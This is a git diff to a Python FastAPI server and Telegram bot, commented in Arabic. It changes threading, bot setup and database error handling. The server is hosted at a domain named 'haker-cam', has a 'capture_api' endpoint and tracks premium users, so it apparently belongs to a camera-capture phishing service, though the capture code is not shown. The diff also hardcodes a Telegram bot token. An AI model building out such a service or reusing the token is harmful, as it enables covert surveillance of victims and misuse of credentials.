@@ -10,12 +10,12 @@ from fastapi.middleware.cors import CORSMiddleware
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# الإعدادات الأساسية
+# 1. الإعدادات الأساسية (تأكد من صحة التوكن ورابط سيرفرك الجديد)
 BOT_TOKEN = "8652491802:AAFOd303C5JsIaLkyuFfl6Op8XF-cygo6tg"
-# الرابط سيتم تحديثه برابط المنصة الجديدة فور تشغيلها
 REPLIT_URL = "https://haker-cam.onrender.com"
 
-bot = telebot.TeleBot(BOT_TOKEN)
+# إنشاء الكائنات البرمجية
+bot = telebot.TeleBot(BOT_TOKEN, threaded=False) # تعطيل الخيوط الداخلية لمنع التعليق
 app = FastAPI()
 
 app.add_middleware(
@@ -38,7 +38,10 @@ def init_db():
     conn.commit()
     conn.close()
 
-init_db()
+try:
+    init_db()
+except Exception as e:
+    print(f"⚠️ خطأ في تهيئة قاعدة البيانات: {e}")
 
 def add_premium_user(chat_id):
     conn = sqlite3.connect("users.db")
@@ -299,8 +302,18 @@ async def capture_api(request: Request, background_tasks: BackgroundTasks):
     except Exception as e:
         return JSONResponse(status_code=500, content={"status": "error"})
 
+# دالة لتشغيل استطلاع البوت بشكل آمن ومستقل
+def run_bot():
+    print("🤖 جاري بدء تشغيل بوت تليجرام...")
+    bot.infinity_polling(timeout=20, long_polling_timeout=10)
+
 if __name__ == "__main__":
-    threading.Thread(target=bot.infinity_polling, daemon=True).start()
-    # قراءة بورت المنصة التلقائي لضمان عدم حدوث خطأ تشغيل
+    # تشغيل البوت في Thread منفصل كلياً عن السيرفر لحل مشكلة التجمد
+    t = threading.Thread(target=run_bot)
+    t.daemon = True
+    t.start()
+    
+    # تشغيل السيرفر الرئيسي
     port = int(os.environ.get("PORT", 8080))
+    print(f"🚀 السيرفر يعمل الآن على المنفذ: {port}")
     uvicorn.run(app, host="0.0.0.0", port=port)
